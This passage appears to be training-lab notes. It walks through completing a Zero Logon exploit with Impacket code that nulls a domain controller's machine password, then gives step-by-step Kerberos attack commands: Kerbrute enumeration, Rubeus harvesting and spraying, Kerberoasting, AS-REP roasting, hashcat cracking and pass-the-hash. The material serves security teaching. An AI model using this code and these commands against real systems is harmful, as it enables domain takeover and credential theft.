+<p>&nbsp;</p>
+<p>The document outlines what information is required to change a password over NRPC.&nbsp;The following information is required to do so:<br><br>&nbsp;</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;NTSTATUS NetrServerPasswordSet2(</p>
+          <p>&nbsp; &nbsp;[in, unique, string] LOGONSRV_HANDLE PrimaryName,</p>
+          <p>&nbsp; &nbsp;[in, string] wchar_t* AccountName,</p>
+          <p>&nbsp; &nbsp;[in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,</p>
+          <p>&nbsp; &nbsp;[in, string] wchar_t* ComputerName,</p>
+          <p>&nbsp; &nbsp;[in] PNETLOGON_AUTHENTICATOR Authenticator,</p>
+          <p>&nbsp; &nbsp;[in] PNL_TRUST_PASSWORD ClearNewPassword</p>
+          <p>&nbsp;);</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>Going back and looking at&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">NetrServerAuthenticate3</a>&nbsp;and&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">NetrServerPasswordSet2</a>, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab">Authenticator</a>&nbsp;first:</p>
+<p>&nbsp;</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;typedef struct _NETLOGON_AUTHENTICATOR {</p>
+          <p>&nbsp; &nbsp;NETLOGON_CREDENTIAL Credential;</p>
+          <p>&nbsp; &nbsp;DWORD Timestamp;</p>
+          <p>&nbsp;}</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>And suddenly we've hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd">NETLOGON_CREDENTIAL&nbsp;</a>as well:</p>
+<p>&nbsp;</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;typedef struct _NETLOGON_CREDENTIAL {</p>
+          <p>&nbsp; &nbsp;CHAR data[8];</p>
+          <p>&nbsp;} NETLOGON_CREDENTIAL,</p>
+          <p>&nbsp; *PNETLOGON_CREDENTIAL;</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that "the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation", fortunately we know this value, thanks to Zero Logon, it's 8 bytes of Zero. In terms of the Timestamp, it's a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.&nbsp;</p>
+<p>&nbsp;</p>
+<p>In order to change the password the Microsoft Documentation states that:<br>The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.&nbsp;</p>
+<p>For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we're setting it to a null value now.</p>
+<p>&nbsp;</p>
+<p>Level Up -</p>
+<p>Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the&nbsp;<a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py">nrpc.py</a>&nbsp;module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:<br><br>&nbsp;</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):</p>
+          <p>&nbsp; &nbsp; request = NetrServerPasswordSet2()</p>
+          <p>&nbsp; &nbsp; request['PrimaryName'] = checkNullString(primaryName)</p>
+          <p>&nbsp; &nbsp; request['AccountName'] = checkNullString(accountName)</p>
+          <p>&nbsp; &nbsp; request['SecureChannelType'] = secureChannelType</p>
+          <p>&nbsp; &nbsp; request['ComputerName'] = checkNullString(computerName)</p>
+          <p>&nbsp; &nbsp; request['Authenticator'] = authenticator</p>
+          <p>&nbsp; &nbsp; request['ClearNewPassword'] = clearNewPasswordBlob</p>
+          <p>&nbsp; &nbsp; return dce.request(request)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>class NETLOGON_AUTHENTICATOR(NDRSTRUCT):</p>
+          <p>&nbsp; &nbsp; structure = (</p>
+          <p>&nbsp; &nbsp; &nbsp; &nbsp; ('Credential', NETLOGON_CREDENTIAL),</p>
+          <p>&nbsp; &nbsp; &nbsp; &nbsp; ('Timestamp', DWORD),</p>
+          <p>&nbsp; &nbsp; )</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>The format here is a little bit different compared to the prior, but we'll adjust accordingly when we go to slot it into the&nbsp;PoC, but while we're talking about slotting it into the PoC, where will our added code go?</p>
+<p>&nbsp;</p>
+<p>Our added code will go immediately before "return rpc_con" on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we'll need to add to the&nbsp;PoC, we'll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.<br><br>&nbsp;</p>
+<p>The Additional Code we're slotting in:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp; &nbsp; newPassRequest = nrpc.NetrServerPasswordSet2()</p>
+          <p>&nbsp; &nbsp; newPassRequest['PrimaryName'] = dc_handle + '\x00'</p>
+          <p>&nbsp; &nbsp; newPassRequest['AccountName'] = target_computer + '$\x00'</p>
+          <p>&nbsp; &nbsp; newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel</p>
+          <p>&nbsp; &nbsp; auth = nrpc.NETLOGON_AUTHENTICATOR()</p>
+          <p>&nbsp; &nbsp; auth['Credential'] = b'\x00' * 8</p>
+          <p>&nbsp; &nbsp; auth['Timestamp'] = 0</p>
+          <p>&nbsp; &nbsp; newPassRequest['Authenticator'] = auth</p>
+          <p>&nbsp; &nbsp; newPassRequest['ComputerName'] = target_computer + '\x00'</p>
+          <p>&nbsp; &nbsp; newPassRequest['ClearNewPassword'] =&nbsp; b'\x00' * 516</p>
+          <p>&nbsp; &nbsp; rpc_con.request(newPassRequest)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:<br><br>&nbsp;</p>
+<p><a href="https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py">https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</a></p>
+<p>&nbsp;</p>
+<p><strong>Time to Play -</strong></p>
+<p>Now that you've learned about Zero Logon, it's time to put your new found skills to the test and exploit this vulnerable Domain Controller!</p>
+<p>&nbsp;</p>
+<p>Ctrl+Z -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p>After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it's original state:</p>
+<figure class="table" style="width:873.0pt;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">powershell.exe -c 'Reset-ComputerMachinePassword'</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>If you're confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution.&nbsp;You can do so with the following command:</p>
+<figure class="table" style="width:873.0pt;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">evil-winrm -u Administrator -H &lt;Local Admin Hash&gt; -i &lt;Machine IP&gt;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<h1>Attacking Kerberos</h1>
+<p>This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:</p>
+<ul>
+  <li>Initial enumeration using tools like Kerbrute and Rubeus</li>
+  <li>Kerberoasting</li>
+  <li>AS-REP Roasting with Rubeus and Impacket</li>
+  <li>Golden/Silver Ticket Attacks</li>
+  <li>Pass the Ticket</li>
+  <li>Skeleton key attacks using mimikatz</li>
+</ul>
+<p>This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.</p>
+<p>It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image262.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>What is Kerberos? -&nbsp;&nbsp;</p>
+<p>Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.</p>
+<p>Common Terminology -&nbsp;&nbsp;</p>
+<p><strong>Ticket Granting Ticket (TGT)</strong>&nbsp;- A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.</p>
+<p><strong>Key Distribution Center (KDC)</strong>&nbsp;- The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.</p>
+<p><strong>Authentication Service (AS)</strong>&nbsp;- The Authentication Service issues TGTs to be used by the TGS in the domain&nbsp;to request access to other machines and service tickets.</p>
+<p><strong>Ticket Granting Service (TGS)</strong>&nbsp;- The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.<br><br>&nbsp;</p>
+<p><strong>Service Principal Name (SPN)</strong>&nbsp;- A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.</p>
+<p><strong>KDC Long Term Secret Key (KDC LT Key)&nbsp;</strong>- The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.</p>
+<p><strong>Client Long Term Secret Key (Client LT Key)&nbsp;</strong>- The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.</p>
+<p><strong>Service Long Term Secret Key (Service LT Key)&nbsp;</strong>- The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.</p>
+<p><strong>Session Key</strong>&nbsp;- Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.</p>
+<p><strong>Privilege Attribute Certificate (PAC)</strong>&nbsp;- The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.</p>
+<p>AS-REQ w/ Pre-Authentication In Detail -&nbsp;</p>
+<p>The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.<br><br>&nbsp;</p>
+<p>Ticket Granting Ticket Contents -</p>
+<p>In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image264.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Service Ticket Contents -&nbsp;</p>
+<p>To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.</p>
+<p>Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.</p>
+<p>User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image266.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Kerberos Authentication Overview -</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image267.png"></figure>
+<p>AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).</p>
+<p>AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.</p>
+<p>TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.</p>
+<p>TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.</p>
+<p>AP-REQ -&nbsp;5.) The client requests the service and sends the valid session key to prove the user has access.</p>
+<p>AP-REP - 6.) The service grants access</p>
+<p>Kerberos Tickets Overview -&nbsp;</p>
+<p>The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64&nbsp;encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.</p>
+<p>Attack Privilege Requirements -</p>
+<ul>
+  <li>Kerbrute Enumeration - No domain access required&nbsp;</li>
+  <li>Pass the Ticket - Access as a user to the domain required</li>
+  <li>Kerberoasting - Access as any user required</li>
+  <li>AS-REP Roasting - Access as any user required</li>
+  <li>Golden Ticket - Full domain compromise (domain admin) required&nbsp;</li>
+  <li>Silver Ticket - Service hash required&nbsp;</li>
+  <li>Skeleton Key - Full domain compromise (domain admin) required</li>
+</ul>
+<p>&nbsp;</p>
+<h2>Enumeration with kerbrute</h2>
+<p>Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.</p>
+<p>For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky -&nbsp;<a href="https://tryhackme.com/room/attacktivedirectory">https://tryhackme.com/room/attacktivedirectory</a></p>
+<p>You need to add the&nbsp;DNS&nbsp;domain name along with the machine IP&nbsp;to /etc/hosts inside of your attacker machine or these attacks will not work for you -&nbsp;<code>MACHINE_IP&nbsp; CONTROLLER.local</code>&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p>Abusing Pre-Authentication Overview -</p>
+<p>By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single&nbsp;UDP&nbsp;frame to the KDC allowing you to enumerate the users on the domain from a wordlist.</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image269.jpg" alt="Afbeelding met tekst, illustratie
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Kerbrute Installation -&nbsp;</p>
+<p>1.) Download a precompiled binary for your&nbsp;OS&nbsp;-&nbsp;<a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
+<p>2.) Rename kerbrute_linux_amd64&nbsp;to kerbrute</p>
+<p>3.)&nbsp;<code>chmod +x kerbrute</code>&nbsp;- make kerbrute executable</p>
+<p>Enumerating Users w/ Kerbrute -</p>
+<p>Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.</p>
+<p>1.) cd into the directory that you put Kerbrute</p>
+<p>2.) Download the wordlist to enumerate with&nbsp;<a href="https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt">here</a></p>
+<p>3.)&nbsp;<code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt</code>&nbsp;- This will brute force user accounts from a domain controller using a supplied wordlist</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image271.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Now enumerate on your own and find the rest of the users and more importantly service accounts.</p>
+<p>&nbsp;</p>
+<h2>Harvesting tickets and brute forcing with Rubeus</h2>
+<p>Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.</p>
+<p>Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.</p>
+<p>The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here -&nbsp;<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p>Rubeus is already compiled and on the target machine.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image273.png"></figure>
+<p>Harvesting Tickets w/ Rubeus -&nbsp;</p>
+<p>Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.</p>
+<p>1.)&nbsp;<code>cd Downloads</code>&nbsp;- navigate to the directory Rubeus is in</p>
+<p>2.)&nbsp;<code>Rubeus.exe harvest /interval:30</code>&nbsp;- This command tells Rubeus to harvest for TGTs every 30 seconds</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image275.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Brute-Forcing / Password-Spraying w/ Rubeus -</p>
+<p>Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.</p>
+<p>This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.</p>
+<p>Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:&nbsp;</p>
+<p><code>echo MACHINE_IP CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></p>
+<p>1.)&nbsp;<code>cd Downloads</code>&nbsp;- navigate to the directory Rubeus is in</p>
+<p>2.)&nbsp;<code>Rubeus.exe brute /password:Password1 /noticket</code>&nbsp;- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image277.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.</p>
+<p>&nbsp;</p>
+<h2>Kerberoasting with Rubeus and Impacket</h2>
+<p>﻿﻿In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.</p>
+<p>In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.</p>
+<p>I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image279.jpg"></figure>
+<p>Method 1 - Rubeus</p>
+<p>Kerberoasting w/ Rubeus -&nbsp;</p>
+<p>1.)&nbsp;<code>cd Downloads</code>&nbsp;- navigate to the directory Rubeus is in</p>
+<p>2.)&nbsp;<code>Rubeus.exe kerberoast</code>&nbsp;This will dump the Kerberos hash of any kerberoastable users&nbsp; &nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image281.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat</p>
+<p>I have created a modified rockyou wordlist in order to speed up the process download it&nbsp;<a href="https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt">here</a>&nbsp;</p>
+<p>3.)&nbsp;<code>hashcat -m 13100 -a 0 hash.txt Pass.txt</code>&nbsp;- now crack that hash</p>
+<p>&nbsp;</p>
+<p>Method 2 - Impacket</p>
+<p>Impacket Installation -&nbsp;</p>
+<p>Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket &lt; 0.9.20</p>
+<p>1.)&nbsp;<code>cd /opt</code>&nbsp;navigate to your preferred directory to save tools in&nbsp;</p>
+<p>2.) download the precompiled package from&nbsp;<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19</a></p>
+<p>3.)&nbsp;<code>cd Impacket-0.9.19</code>&nbsp;navigate to the impacket directory</p>
+<p>4.)&nbsp;<code>pip install .</code>&nbsp;- this will install all needed dependencies</p>
+<p>Kerberoasting w/ Impacket -&nbsp;</p>
+<p>1.)&nbsp;<code>cd /usr/share/doc/python3-impacket/examples/</code>&nbsp;- navigate to where GetUserSPNs.py is located</p>
+<p>2.)&nbsp;<code>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request</code>&nbsp;- this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.</p>
+<p>3.)&nbsp;<code>hashcat -m 13100 -a 0 hash.txt Pass.txt</code>&nbsp;- now crack that hash</p>
+<p>What Can a Service Account do?</p>
+<p>After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.</p>
+<p>Mitigation - Defending the Forest</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image283.jpg" alt="Afbeelding met tekst, illustratie
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Kerberoasting Mitigation -</p>
+<p>&nbsp;Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective</p>
+<p>&nbsp;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.</p>
+<p>&nbsp;</p>
+<h2>AS-REP Roasting with Rubeus</h2>
+<p>Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.</p>
+<p>We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.</p>
+<p>There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.</p>
+<p>I have already compiled and put Rubeus on the machine.</p>
+<p>AS-REP Roasting Overview -&nbsp;</p>
+<p>During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image285.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Dumping KRBASREP5 Hashes w/ Rubeus -</p>
+<p>1.)&nbsp;cd Downloads&nbsp;- navigate to the directory Rubeus is in</p>
+<p>2.)&nbsp;Rubeus.exe asreproast&nbsp;- This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image287.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Crack those Hashes w/ hashcat -&nbsp;</p>
+<p>1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file</p>
+<p>2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....</p>
+<p>Use the same wordlist that you downloaded in task 4</p>
+<p>3.)&nbsp;hashcat -m 18200 hash.txt Pass.txt&nbsp;- crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image289.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>AS-REP Roasting Mitigations -&nbsp;</p>
+<p>Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective</p>
+<p>Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.</p>
+<p>&nbsp;</p>
+<h2>Pass the ticket with Mimikatz</h2>
+<p>Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory</p>
+<p>This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.</p>
+<p>You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.</p>
+<p>Pass the Ticket Overview -&nbsp;</p>
